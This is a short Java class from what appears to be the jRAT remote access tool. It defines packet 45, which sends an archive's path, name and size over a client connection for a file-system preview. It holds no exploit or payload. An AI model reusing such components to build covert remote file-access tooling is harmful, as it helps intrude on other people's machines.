package jrat.module.fs.packets;

import jrat.client.Connection;
import jrat.client.packets.outgoing.OutgoingPacket;


public class Packet45ArchivePreview implements OutgoingPacket {

    private String path;
	private String name;
	private long size;

	public Packet45ArchivePreview(String path, String name, long size) {
	    this.path = path;
		this.name = name;
		this.size = size;
	}

	@Override
	public void write(Connection con) throws Exception {
	    con.writeLine(path);
        con.writeLine(name);
        con.writeLong(size);
	}

	@Override
	public short getPacketId() {
		return 45;
	}

}
